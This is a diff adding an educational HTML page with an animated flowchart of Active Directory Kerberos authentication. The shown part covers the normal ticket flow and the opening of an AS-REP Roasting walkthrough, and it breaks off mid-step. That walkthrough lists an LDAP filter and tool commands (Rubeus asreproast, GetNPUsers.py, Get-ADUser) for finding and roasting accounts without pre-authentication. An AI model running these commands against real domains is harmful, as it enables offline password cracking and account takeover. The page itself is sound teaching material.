@@ -1,0 +1,1885 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>AD Kerberos Flowchart - Interactive Authentication & Attack Visualizer</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Interactive Kerberos authentication flowchart with animated packet flows. Learn how Kerberos works and understand attacks like Kerberoasting, Golden Ticket, AS-REP Roasting.">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+	<style>
+		* { box-sizing: border-box; }
+		body {
+			font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+			background-color: #0a0a1a;
+			margin: 0;
+			padding: 0;
+			line-height: 1.6;
+			color: #e0e0e0;
+		}
+
+		.navbar {
+			background-color: #1a1a2e !important;
+			padding: 15px 0;
+			box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+		}
+		.navbar-brand { color: #fff !important; font-size: 22px; font-weight: 600; }
+		.nav-link { color: rgba(255,255,255,0.9) !important; font-size: 16px; margin-left: 20px; transition: color 0.3s; }
+		.nav-link:hover { color: #4a9eff !important; }
+
+		.hero-section {
+			background: linear-gradient(135deg, #1a1a2e 0%, #0f3460 100%);
+			color: #fff;
+			padding: 40px 0;
+			text-align: center;
+			border-bottom: 3px solid #e94560;
+		}
+		.hero-section h1 { font-size: 36px; font-weight: 700; margin-bottom: 10px; }
+		.hero-section p { font-size: 16px; opacity: 0.9; }
+
+		.main-content { padding: 30px 0; }
+
+		/* Topic Navigation */
+		.topic-nav {
+			display: flex;
+			flex-wrap: wrap;
+			gap: 10px;
+			justify-content: center;
+			margin-bottom: 30px;
+		}
+		.topic-btn {
+			padding: 12px 24px;
+			border: 2px solid #4a9eff;
+			background: transparent;
+			color: #4a9eff;
+			border-radius: 30px;
+			cursor: pointer;
+			font-weight: 600;
+			transition: all 0.3s;
+		}
+		.topic-btn:hover, .topic-btn.active {
+			background: linear-gradient(135deg, #4a9eff 0%, #00d2ff 100%);
+			color: #fff;
+			transform: translateY(-2px);
+			box-shadow: 0 5px 20px rgba(74, 158, 255, 0.4);
+		}
+		.topic-btn.attack {
+			border-color: #e94560;
+			color: #e94560;
+		}
+		.topic-btn.attack:hover, .topic-btn.attack.active {
+			background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
+			color: #fff;
+			box-shadow: 0 5px 20px rgba(233, 69, 96, 0.4);
+		}
+
+		/* Flowchart Container */
+		.flowchart-container {
+			background: linear-gradient(180deg, #0f0f23 0%, #1a1a2e 100%);
+			border-radius: 15px;
+			padding: 30px;
+			margin-bottom: 30px;
+			border: 1px solid #2a2a4a;
+			min-height: 500px;
+			position: relative;
+			overflow: hidden;
+		}
+
+		/* Entities */
+		.entity {
+			position: absolute;
+			text-align: center;
+			z-index: 10;
+		}
+		.entity-icon {
+			width: 80px;
+			height: 80px;
+			border-radius: 50%;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			margin: 0 auto 10px;
+			font-size: 32px;
+			box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+			transition: all 0.3s;
+		}
+		.entity-icon.client { background: linear-gradient(135deg, #4a9eff 0%, #00d2ff 100%); }
+		.entity-icon.kdc { background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%); }
+		.entity-icon.krbtgt { background: linear-gradient(135deg, #9b59b6 0%, #8e44ad 100%); }
+		.entity-icon.service { background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%); }
+		.entity-icon.attacker { background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); }
+		.entity-icon.dc { background: linear-gradient(135deg, #e67e22 0%, #d35400 100%); }
+
+		.entity-label {
+			font-weight: 700;
+			font-size: 14px;
+			color: #fff;
+			text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+		}
+		.entity-sublabel {
+			font-size: 11px;
+			color: #aaa;
+		}
+
+		/* Animated Packets */
+		.packet {
+			position: absolute;
+			padding: 8px 16px;
+			border-radius: 20px;
+			font-size: 11px;
+			font-weight: 700;
+			white-space: nowrap;
+			z-index: 20;
+			opacity: 0;
+			box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+		}
+		.packet.as-req { background: #4a9eff; color: #fff; }
+		.packet.as-rep { background: #f39c12; color: #fff; }
+		.packet.tgs-req { background: #9b59b6; color: #fff; }
+		.packet.tgs-rep { background: #27ae60; color: #fff; }
+		.packet.ap-req { background: #00d2ff; color: #000; }
+		.packet.ap-rep { background: #2ecc71; color: #000; }
+		.packet.malicious { background: #e74c3c; color: #fff; }
+		.packet.ticket { background: #f1c40f; color: #000; }
+
+		/* Flow Lines */
+		.flow-line {
+			position: absolute;
+			height: 3px;
+			background: linear-gradient(90deg, transparent, #4a9eff, transparent);
+			transform-origin: left center;
+			z-index: 5;
+		}
+
+		/* Step Indicator */
+		.step-indicator {
+			position: fixed;
+			bottom: 30px;
+			left: 50%;
+			transform: translateX(-50%);
+			display: flex;
+			gap: 10px;
+			z-index: 100;
+			background: rgba(26, 26, 46, 0.95);
+			padding: 15px 25px;
+			border-radius: 50px;
+			box-shadow: 0 5px 30px rgba(0,0,0,0.5);
+		}
+		.step-dot {
+			width: 12px;
+			height: 12px;
+			border-radius: 50%;
+			background: #333;
+			transition: all 0.3s;
+			cursor: pointer;
+		}
+		.step-dot.active { background: #4a9eff; transform: scale(1.3); }
+		.step-dot.completed { background: #27ae60; }
+		.step-dot.attack { background: #e74c3c; }
+
+		/* Controls */
+		.controls {
+			display: flex;
+			justify-content: center;
+			gap: 15px;
+			margin-bottom: 20px;
+		}
+		.control-btn {
+			padding: 10px 30px;
+			border: none;
+			border-radius: 25px;
+			cursor: pointer;
+			font-weight: 600;
+			transition: all 0.3s;
+		}
+		.control-btn.play {
+			background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
+			color: #fff;
+		}
+		.control-btn.pause {
+			background: linear-gradient(135deg, #e67e22 0%, #f39c12 100%);
+			color: #fff;
+		}
+		.control-btn.reset {
+			background: linear-gradient(135deg, #95a5a6 0%, #7f8c8d 100%);
+			color: #fff;
+		}
+		.control-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(0,0,0,0.3); }
+
+		/* Explanation Panel */
+		.explanation-panel {
+			background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+			border-radius: 12px;
+			padding: 25px;
+			border: 1px solid #2a2a4a;
+			margin-top: 20px;
+		}
+		.explanation-panel h3 {
+			color: #4a9eff;
+			margin-bottom: 15px;
+			font-size: 20px;
+		}
+		.explanation-panel .step-title {
+			color: #f39c12;
+			font-weight: 700;
+			font-size: 18px;
+			margin-bottom: 10px;
+		}
+		.explanation-panel .step-desc {
+			color: #ccc;
+			font-size: 15px;
+			line-height: 1.8;
+		}
+		.explanation-panel code {
+			background: #0a0a1a;
+			color: #4a9eff;
+			padding: 2px 8px;
+			border-radius: 4px;
+			font-size: 13px;
+		}
+		.explanation-panel .tech-detail {
+			background: #0a0a1a;
+			border-left: 3px solid #4a9eff;
+			padding: 15px;
+			margin: 15px 0;
+			border-radius: 0 8px 8px 0;
+		}
+		.explanation-panel .warning {
+			background: rgba(231, 76, 60, 0.1);
+			border-left: 3px solid #e74c3c;
+			padding: 15px;
+			margin: 15px 0;
+			border-radius: 0 8px 8px 0;
+		}
+		.explanation-panel .success {
+			background: rgba(39, 174, 96, 0.1);
+			border-left: 3px solid #27ae60;
+			padding: 15px;
+			margin: 15px 0;
+			border-radius: 0 8px 8px 0;
+		}
+
+		/* Packet Contents */
+		.packet-contents {
+			background: #0a0a1a;
+			border-radius: 8px;
+			padding: 15px;
+			margin: 10px 0;
+			font-family: 'Consolas', monospace;
+			font-size: 12px;
+			border: 1px solid #2a2a4a;
+		}
+		.packet-contents .field {
+			display: flex;
+			margin: 5px 0;
+		}
+		.packet-contents .field-name {
+			color: #e74c3c;
+			min-width: 180px;
+		}
+		.packet-contents .field-value {
+			color: #2ecc71;
+		}
+		.packet-contents .encrypted {
+			color: #f39c12;
+			font-style: italic;
+		}
+
+		/* Speed Control */
+		.speed-control {
+			display: flex;
+			align-items: center;
+			gap: 10px;
+			justify-content: center;
+			margin-bottom: 20px;
+		}
+		.speed-control label { color: #aaa; }
+		.speed-control input[type="range"] {
+			width: 150px;
+			accent-color: #4a9eff;
+		}
+
+		/* Legend */
+		.legend {
+			display: flex;
+			flex-wrap: wrap;
+			gap: 15px;
+			justify-content: center;
+			margin-bottom: 20px;
+		}
+		.legend-item {
+			display: flex;
+			align-items: center;
+			gap: 8px;
+			font-size: 12px;
+			color: #aaa;
+		}
+		.legend-color {
+			width: 20px;
+			height: 20px;
+			border-radius: 50%;
+		}
+
+		footer {
+			background: #1a1a2e;
+			color: #fff;
+			padding: 30px 0;
+			text-align: center;
+		}
+		footer p { margin: 0; opacity: 0.8; }
+
+		/* Animations */
+		@keyframes pulse {
+			0%, 100% { transform: scale(1); box-shadow: 0 5px 20px rgba(0,0,0,0.3); }
+			50% { transform: scale(1.1); box-shadow: 0 5px 30px rgba(74, 158, 255, 0.5); }
+		}
+		@keyframes glow {
+			0%, 100% { box-shadow: 0 0 5px currentColor; }
+			50% { box-shadow: 0 0 20px currentColor, 0 0 30px currentColor; }
+		}
+		.entity-icon.active { animation: pulse 1s infinite; }
+
+		/* SVG Arrow styles */
+		.arrow-line {
+			stroke-dasharray: 10;
+			animation: dash 0.5s linear infinite;
+		}
+		@keyframes dash {
+			to { stroke-dashoffset: -20; }
+		}
+
+		/* Section tabs */
+		.section-tabs {
+			display: flex;
+			gap: 5px;
+			margin-bottom: 20px;
+			flex-wrap: wrap;
+			justify-content: center;
+		}
+		.section-tab {
+			padding: 8px 16px;
+			background: #1a1a2e;
+			border: 1px solid #2a2a4a;
+			color: #aaa;
+			cursor: pointer;
+			border-radius: 5px;
+			font-size: 13px;
+			transition: all 0.3s;
+		}
+		.section-tab:hover, .section-tab.active {
+			background: #4a9eff;
+			color: #fff;
+			border-color: #4a9eff;
+		}
+	</style>
+</head>
+<body>
+	<!-- Navigation Bar -->
+	<nav class="navbar navbar-expand-lg navbar-dark">
+		<div class="container">
+			<a class="navbar-brand" href="../index.html">Shravan Kumar Sheri</a>
+			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav">
+				<span class="navbar-toggler-icon"></span>
+			</button>
+			<div class="collapse navbar-collapse" id="navbarNav">
+				<ul class="navbar-nav ml-auto">
+					<li class="nav-item"><a class="nav-link" href="../index.html">Home</a></li>
+					<li class="nav-item"><a class="nav-link" href="../blog.html">Blog</a></li>
+					<li class="nav-item active"><a class="nav-link" href="../tools.html">Tools</a></li>
+				</ul>
+			</div>
+		</div>
+	</nav>
+
+	<!-- Hero Section -->
+	<section class="hero-section">
+		<div class="container">
+			<h1><i class="fas fa-project-diagram"></i> AD Kerberos Flowchart</h1>
+			<p>Interactive visualization of Kerberos authentication and attacks with animated packet flows</p>
+		</div>
+	</section>
+
+	<!-- Main Content -->
+	<section class="main-content">
+		<div class="container-fluid" style="max-width: 1400px;">
+			<!-- Topic Navigation -->
+			<div class="topic-nav">
+				<button class="topic-btn active" onclick="loadTopic('kerberos-auth')">
+					<i class="fas fa-key"></i> Kerberos Authentication
+				</button>
+				<button class="topic-btn attack" onclick="loadTopic('asrep-roast')">
+					<i class="fas fa-fire"></i> AS-REP Roasting
+				</button>
+				<button class="topic-btn attack" onclick="loadTopic('kerberoasting')">
+					<i class="fas fa-utensils"></i> Kerberoasting
+				</button>
+				<button class="topic-btn attack" onclick="loadTopic('golden-ticket')">
+					<i class="fas fa-crown"></i> Golden Ticket
+				</button>
+				<button class="topic-btn attack" onclick="loadTopic('silver-ticket')">
+					<i class="fas fa-medal"></i> Silver Ticket
+				</button>
+				<button class="topic-btn attack" onclick="loadTopic('pass-the-ticket')">
+					<i class="fas fa-ticket-alt"></i> Pass-the-Ticket
+				</button>
+				<button class="topic-btn attack" onclick="loadTopic('overpass-hash')">
+					<i class="fas fa-hashtag"></i> Overpass-the-Hash
+				</button>
+				<button class="topic-btn attack" onclick="loadTopic('unconstrained-deleg')">
+					<i class="fas fa-unlock"></i> Unconstrained Delegation
+				</button>
+			</div>
+
+			<!-- Legend -->
+			<div class="legend">
+				<div class="legend-item">
+					<div class="legend-color" style="background: linear-gradient(135deg, #4a9eff 0%, #00d2ff 100%);"></div>
+					<span>Client/User</span>
+				</div>
+				<div class="legend-item">
+					<div class="legend-color" style="background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);"></div>
+					<span>KDC (Domain Controller)</span>
+				</div>
+				<div class="legend-item">
+					<div class="legend-color" style="background: linear-gradient(135deg, #9b59b6 0%, #8e44ad 100%);"></div>
+					<span>KRBTGT Account</span>
+				</div>
+				<div class="legend-item">
+					<div class="legend-color" style="background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);"></div>
+					<span>Service/Server</span>
+				</div>
+				<div class="legend-item">
+					<div class="legend-color" style="background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);"></div>
+					<span>Attacker</span>
+				</div>
+			</div>
+
+			<!-- Controls -->
+			<div class="controls">
+				<button class="control-btn play" onclick="playAnimation()" id="playBtn">
+					<i class="fas fa-play"></i> Play
+				</button>
+				<button class="control-btn pause" onclick="pauseAnimation()" id="pauseBtn" style="display:none;">
+					<i class="fas fa-pause"></i> Pause
+				</button>
+				<button class="control-btn reset" onclick="resetAnimation()">
+					<i class="fas fa-redo"></i> Reset
+				</button>
+			</div>
+
+			<!-- Speed Control -->
+			<div class="speed-control">
+				<label><i class="fas fa-tachometer-alt"></i> Speed:</label>
+				<input type="range" min="0.5" max="3" step="0.5" value="1" id="speedControl" onchange="updateSpeed(this.value)">
+				<span id="speedLabel">1x</span>
+			</div>
+
+			<!-- Flowchart Container -->
+			<div class="flowchart-container" id="flowchartContainer">
+				<!-- SVG for lines/arrows -->
+				<svg id="flowSvg" style="position:absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:1;">
+					<defs>
+						<marker id="arrowhead" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+							<polygon points="0 0, 10 3.5, 0 7" fill="#4a9eff" />
+						</marker>
+						<marker id="arrowhead-orange" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+							<polygon points="0 0, 10 3.5, 0 7" fill="#f39c12" />
+						</marker>
+						<marker id="arrowhead-green" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+							<polygon points="0 0, 10 3.5, 0 7" fill="#27ae60" />
+						</marker>
+						<marker id="arrowhead-red" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+							<polygon points="0 0, 10 3.5, 0 7" fill="#e74c3c" />
+						</marker>
+					</defs>
+				</svg>
+				<!-- Entities will be dynamically inserted here -->
+			</div>
+
+			<!-- Step Navigation -->
+			<div class="step-indicator" id="stepIndicator">
+				<!-- Steps will be dynamically inserted -->
+			</div>
+
+			<!-- Explanation Panel -->
+			<div class="explanation-panel" id="explanationPanel">
+				<h3><i class="fas fa-info-circle"></i> Step Details</h3>
+				<div id="stepContent">
+					<p class="step-desc">Click "Play" to start the animation and see the Kerberos authentication flow step by step.</p>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<footer>
+		<div class="container">
+			<p>&copy; 2025 Shravan Kumar Sheri - All Rights Reserved</p>
+		</div>
+	</footer>
+
+	<script>
+		// Animation State
+		let currentStep = 0;
+		let isPlaying = false;
+		let animationSpeed = 1;
+		let animationTimeout = null;
+		let currentTopic = 'kerberos-auth';
+
+		// Topic Definitions
+		const topics = {
+			'kerberos-auth': {
+				title: 'Kerberos Authentication Flow',
+				entities: [
+					{ id: 'client', type: 'client', label: 'Client', sublabel: 'User Workstation', x: 5, y: 40 },
+					{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 45, y: 10 },
+					{ id: 'krbtgt', type: 'krbtgt', label: 'KRBTGT', sublabel: 'Key Distribution', x: 45, y: 70 },
+					{ id: 'service', type: 'service', label: 'Service', sublabel: 'Target Server', x: 85, y: 40 }
+				],
+				steps: [
+					{
+						title: 'Step 1: User Initiates Login',
+						description: 'The user enters their username and password on their workstation. The client computes a hash of the password which will be used for authentication.',
+						activeEntity: 'client',
+						techDetail: `<strong>What happens locally:</strong><br>
+							1. User enters credentials (username + password)<br>
+							2. Client derives the user's secret key: <code>NT Hash = MD4(UTF-16LE(password))</code><br>
+							3. This hash is NEVER sent over the network<br>
+							4. A timestamp is encrypted with this hash to prove knowledge of password`,
+						packetContents: null
+					},
+					{
+						title: 'Step 2: AS-REQ (Authentication Service Request)',
+						description: 'The client sends an AS-REQ to the KDC requesting a Ticket Granting Ticket (TGT). This request includes a timestamp encrypted with the user\'s password hash (pre-authentication).',
+						activeEntity: 'client',
+						animation: { from: 'client', to: 'kdc', packet: 'AS-REQ', type: 'as-req' },
+						techDetail: `<strong>AS-REQ Structure:</strong><br>
+							• <span style="color:#e74c3c">pvno:</span> Kerberos version (5)<br>
+							• <span style="color:#e74c3c">msg-type:</span> KRB_AS_REQ (10)<br>
+							• <span style="color:#e74c3c">padata:</span> Pre-authentication data (encrypted timestamp)<br>
+							• <span style="color:#e74c3c">req-body:</span> Contains client principal, realm, requested service (krbtgt)`,
+						packetContents: {
+							'pvno': '5',
+							'msg-type': 'KRB_AS_REQ (10)',
+							'padata[PA-ENC-TIMESTAMP]': '{ timestamp encrypted with user\'s NT hash }',
+							'req-body.cname': 'john.doe@CORP.LOCAL',
+							'req-body.realm': 'CORP.LOCAL',
+							'req-body.sname': 'krbtgt/CORP.LOCAL',
+							'req-body.till': '20370913024805Z (max lifetime)',
+							'req-body.nonce': 'Random 32-bit number',
+							'req-body.etype': '[23, 18, 17] (encryption types)'
+						}
+					},
+					{
+						title: 'Step 3: KDC Validates Pre-Authentication',
+						description: 'The KDC retrieves the user\'s password hash from Active Directory and attempts to decrypt the timestamp. If successful, the user is authenticated.',
+						activeEntity: 'kdc',
+						techDetail: `<strong>Validation Process:</strong><br>
+							1. KDC looks up user in AD by principal name<br>
+							2. Retrieves user's NT hash from ntds.dit<br>
+							3. Decrypts the PA-ENC-TIMESTAMP<br>
+							4. Verifies timestamp is within 5-minute clock skew<br>
+							5. If valid → user is authenticated<br><br>
+							<strong>If pre-auth is disabled:</strong> This step is skipped (AS-REP Roasting vulnerability!)`,
+						packetContents: null
+					},
+					{
+						title: 'Step 4: AS-REP (Authentication Service Response)',
+						description: 'The KDC generates a TGT encrypted with the KRBTGT account\'s hash and sends it back to the client along with a session key.',
+						activeEntity: 'kdc',
+						animation: { from: 'kdc', to: 'client', packet: 'AS-REP + TGT', type: 'as-rep' },
+						techDetail: `<strong>AS-REP Contains Two Parts:</strong><br><br>
+							<span style="color:#f39c12">Part 1 - Encrypted with User's Hash:</span><br>
+							• Session Key (for TGS communication)<br>
+							• Ticket validity times<br>
+							• Nonce (to prevent replay)<br><br>
+							<span style="color:#9b59b6">Part 2 - The TGT (encrypted with KRBTGT hash):</span><br>
+							• User's SID and group memberships (PAC)<br>
+							• Session key (copy)<br>
+							• Ticket timestamps`,
+						packetContents: {
+							'pvno': '5',
+							'msg-type': 'KRB_AS_REP (11)',
+							'crealm': 'CORP.LOCAL',
+							'cname': 'john.doe',
+							'ticket (TGT)': '{ ENCRYPTED with KRBTGT hash }',
+							'  → tkt-realm': 'CORP.LOCAL',
+							'  → tkt-sname': 'krbtgt/CORP.LOCAL',
+							'  → enc-part': 'Contains PAC, session key, timestamps',
+							'enc-part': '{ ENCRYPTED with user\'s NT hash }',
+							'  → session-key': 'Random key for TGS requests',
+							'  → nonce': 'Matches request nonce',
+							'  → authtime': 'When authenticated',
+							'  → endtime': 'TGT expiration (usually 10 hours)'
+						}
+					},
+					{
+						title: 'Step 5: Client Decrypts and Stores TGT',
+						description: 'The client uses its password hash to decrypt the first part of AS-REP, extracting the session key. The TGT (still encrypted with KRBTGT hash) is stored in memory.',
+						activeEntity: 'client',
+						techDetail: `<strong>Client-Side Operations:</strong><br>
+							1. Decrypt enc-part using user's NT hash<br>
+							2. Extract and cache the session key<br>
+							3. Store the TGT in credential cache (ccache/kirbi)<br>
+							4. TGT cannot be decrypted by client (only KDC can)<br><br>
+							<strong>Windows Storage:</strong> LSASS memory<br>
+							<strong>Linux Storage:</strong> /tmp/krb5cc_* or KEYRING`,
+						packetContents: null
+					},
+					{
+						title: 'Step 6: TGS-REQ (Ticket Granting Service Request)',
+						description: 'When the user wants to access a service, the client sends a TGS-REQ to the KDC. This includes the TGT and an authenticator encrypted with the TGS session key.',
+						activeEntity: 'client',
+						animation: { from: 'client', to: 'kdc', packet: 'TGS-REQ + TGT', type: 'tgs-req' },
+						techDetail: `<strong>TGS-REQ Structure:</strong><br>
+							• The TGT proves the user was authenticated<br>
+							• Authenticator proves the sender has the session key<br>
+							• SPN identifies which service is requested<br><br>
+							<strong>Service Principal Name (SPN) format:</strong><br>
+							<code>service_class/host:port/service_name</code><br>
+							Example: <code>HTTP/web01.corp.local</code>`,
+						packetContents: {
+							'pvno': '5',
+							'msg-type': 'KRB_TGS_REQ (12)',
+							'padata[PA-TGS-REQ]': '{ AP-REQ containing TGT }',
+							'  → authenticator': '{ timestamp encrypted with TGS session key }',
+							'  → ticket': '{ The TGT from AS-REP }',
+							'req-body.realm': 'CORP.LOCAL',
+							'req-body.sname': 'HTTP/web01.corp.local',
+							'req-body.till': '20370913024805Z',
+							'req-body.nonce': 'New random number',
+							'req-body.etype': '[23, 18, 17]'
+						}
+					},
+					{
+						title: 'Step 7: KDC Validates TGT and Issues Service Ticket',
+						description: 'The KDC decrypts the TGT using the KRBTGT hash, validates the authenticator, and creates a service ticket encrypted with the target service\'s password hash.',
+						activeEntity: 'kdc',
+						animation: { from: 'kdc', to: 'krbtgt', packet: 'Decrypt TGT', type: 'tgs-req' },
+						techDetail: `<strong>KDC Processing:</strong><br>
+							1. Decrypt TGT using KRBTGT account's hash<br>
+							2. Extract session key from TGT<br>
+							3. Use session key to decrypt authenticator<br>
+							4. Verify timestamp in authenticator (5-min skew)<br>
+							5. Look up target service account in AD<br>
+							6. Retrieve service account's NT hash<br>
+							7. Create service ticket encrypted with service hash<br>
+							8. Copy PAC from TGT to service ticket`,
+						packetContents: null
+					},
+					{
+						title: 'Step 8: TGS-REP (Ticket Granting Service Response)',
+						description: 'The KDC sends the service ticket back to the client. The ticket is encrypted with the target service\'s password hash, which the client cannot decrypt.',
+						activeEntity: 'kdc',
+						animation: { from: 'kdc', to: 'client', packet: 'TGS-REP + Service Ticket', type: 'tgs-rep' },
+						techDetail: `<strong>TGS-REP Contains:</strong><br><br>
+							<span style="color:#f39c12">Part 1 - Encrypted with TGS Session Key:</span><br>
+							• Service session key (for AP-REQ)<br>
+							• Service name, realm, timestamps<br><br>
+							<span style="color:#27ae60">Part 2 - Service Ticket (encrypted with service hash):</span><br>
+							• User's PAC (SID, groups)<br>
+							• Service session key (copy)<br>
+							• Timestamps`,
+						packetContents: {
+							'pvno': '5',
+							'msg-type': 'KRB_TGS_REP (13)',
+							'crealm': 'CORP.LOCAL',
+							'cname': 'john.doe',
+							'ticket (Service Ticket)': '{ ENCRYPTED with service account hash }',
+							'  → tkt-realm': 'CORP.LOCAL',
+							'  → tkt-sname': 'HTTP/web01.corp.local',
+							'  → enc-part': 'Contains PAC, service session key',
+							'enc-part': '{ ENCRYPTED with TGS session key }',
+							'  → session-key': 'Key for service communication',
+							'  → nonce': 'Matches TGS-REQ nonce',
+							'  → authtime': 'Original auth time',
+							'  → endtime': 'Ticket expiration'
+						}
+					},
+					{
+						title: 'Step 9: AP-REQ (Application Request)',
+						description: 'The client connects to the target service and presents the service ticket along with an authenticator encrypted with the service session key.',
+						activeEntity: 'client',
+						animation: { from: 'client', to: 'service', packet: 'AP-REQ + Service Ticket', type: 'ap-req' },
+						techDetail: `<strong>AP-REQ to Service:</strong><br>
+							• Client connects to service (HTTP, SMB, SQL, etc.)<br>
+							• Sends service ticket (opaque to client)<br>
+							• Includes authenticator proving possession of session key<br><br>
+							<strong>Authenticator Contains:</strong><br>
+							• Client name and realm<br>
+							• Current timestamp<br>
+							• Optional: subkey for further encryption`,
+						packetContents: {
+							'pvno': '5',
+							'msg-type': 'KRB_AP_REQ (14)',
+							'ap-options': 'mutual-required, use-session-key',
+							'ticket': '{ Service ticket from TGS-REP }',
+							'authenticator': '{ ENCRYPTED with service session key }',
+							'  → cname': 'john.doe',
+							'  → crealm': 'CORP.LOCAL',
+							'  → ctime': 'Current timestamp',
+							'  → cusec': 'Microseconds',
+							'  → subkey': 'Optional session subkey'
+						}
+					},
+					{
+						title: 'Step 10: Service Validates Ticket',
+						description: 'The service decrypts the ticket using its own password hash, extracts the session key, and uses it to decrypt the authenticator. The PAC reveals the user\'s identity and group memberships.',
+						activeEntity: 'service',
+						techDetail: `<strong>Service-Side Validation:</strong><br>
+							1. Decrypt service ticket using service account's hash<br>
+							2. Extract service session key<br>
+							3. Decrypt authenticator with session key<br>
+							4. Verify timestamp (5-minute skew)<br>
+							5. Check authenticator hasn't been replayed<br>
+							6. Extract PAC for authorization<br>
+							7. User's groups determine access rights`,
+						packetContents: null
+					},
+					{
+						title: 'Step 11: AP-REP (Application Response) - Optional',
+						description: 'If mutual authentication was requested, the service proves its identity by sending back the authenticator timestamp encrypted with the session key.',
+						activeEntity: 'service',
+						animation: { from: 'service', to: 'client', packet: 'AP-REP', type: 'ap-rep' },
+						techDetail: `<strong>Mutual Authentication:</strong><br>
+							• Service proves it could decrypt the ticket<br>
+							• Confirms the service knows its own password<br>
+							• Prevents man-in-the-middle attacks<br><br>
+							<strong>AP-REP Contents:</strong><br>
+							• Encrypted with service session key<br>
+							• Contains client's timestamp from authenticator<br>
+							• Optional: subkey for session encryption`,
+						packetContents: {
+							'pvno': '5',
+							'msg-type': 'KRB_AP_REP (15)',
+							'enc-part': '{ ENCRYPTED with service session key }',
+							'  → ctime': 'Timestamp from client authenticator',
+							'  → cusec': 'Microseconds from authenticator',
+							'  → subkey': 'Optional session encryption key',
+							'  → seq-number': 'For message ordering'
+						}
+					},
+					{
+						title: 'Step 12: Session Established!',
+						description: 'Authentication is complete! The client can now access the service using the established session. All further communication can be encrypted with the session key.',
+						activeEntity: 'service',
+						techDetail: `<strong>Session Established:</strong><br>
+							✓ User authenticated via Kerberos<br>
+							✓ Service verified user's identity<br>
+							✓ Authorization based on PAC groups<br>
+							✓ Optional encryption for data in transit<br><br>
+							<strong>Key Points:</strong><br>
+							• Password never sent over network<br>
+							• Each ticket has limited lifetime<br>
+							• Session keys are unique per session<br>
+							• TGT allows SSO to multiple services`,
+						packetContents: null,
+						success: true
+					}
+				]
+			},
+
+			'asrep-roast': {
+				title: 'AS-REP Roasting Attack',
+				entities: [
+					{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Malicious Actor', x: 5, y: 40 },
+					{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 50, y: 40 },
+					{ id: 'victim', type: 'client', label: 'Victim User', sublabel: 'No Pre-Auth Required', x: 85, y: 10 }
+				],
+				steps: [
+					{
+						title: 'Vulnerability: Pre-Authentication Disabled',
+						description: 'Some accounts have "Do not require Kerberos preauthentication" enabled. This allows anyone to request an AS-REP for these users without proving they know the password.',
+						activeEntity: 'victim',
+						techDetail: `<strong>Why is Pre-Auth Disabled?</strong><br>
+							• Legacy application compatibility<br>
+							• Misconfiguration<br>
+							• Service accounts<br><br>
+							<strong>LDAP Query to Find Vulnerable Users:</strong><br>
+							<code>(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</code><br><br>
+							<strong>UAC Flag:</strong> DONT_REQ_PREAUTH = 0x400000 (4194304)`,
+						warning: 'This setting allows attackers to request encrypted data that can be cracked offline!'
+					},
+					{
+						title: 'Step 1: Enumerate Vulnerable Users',
+						description: 'The attacker queries Active Directory to find accounts with pre-authentication disabled. This can be done with any domain user credentials or even anonymously if LDAP allows.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Tools for Enumeration:</strong><br>
+							• <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}</code><br>
+							• <code>ldapsearch</code> with DONT_REQ_PREAUTH filter<br>
+							• BloodHound (marks as "AS-REP Roastable")<br>
+							• Rubeus: <code>Rubeus.exe asreproast /user:all</code><br>
+							• Impacket: <code>GetNPUsers.py</code>`,
+						packetContents: null
+					},
+					{
+						title: 'Step 2: Send AS-REQ Without Pre-Auth',
+						description: 'The attacker sends an AS-REQ for the vulnerable user WITHOUT including encrypted timestamp (no pre-authentication). Since pre-auth is disabled, the KDC accepts it.',
+						activeEntity: 'attacker',
+						animation: { from: 'attacker', to: 'kdc', packet: 'AS-REQ (no pre-auth)', type: 'malicious' },
+						techDetail: `<strong>Malicious AS-REQ:</strong><br>
+							• No PA-ENC-TIMESTAMP field<br>
+							• Just requests TGT for victim user<br>
+							• Attacker doesn't need victim's password<br>
+							• KDC doesn't verify requester's identity`,
+						packetContents: {
+							'pvno': '5',
+							'msg-type': 'KRB_AS_REQ (10)',
+							'padata': '[ ] ← EMPTY! No pre-authentication!',
+							'req-body.cname': 'victim.user@CORP.LOCAL',
+							'req-body.realm': 'CORP.LOCAL',
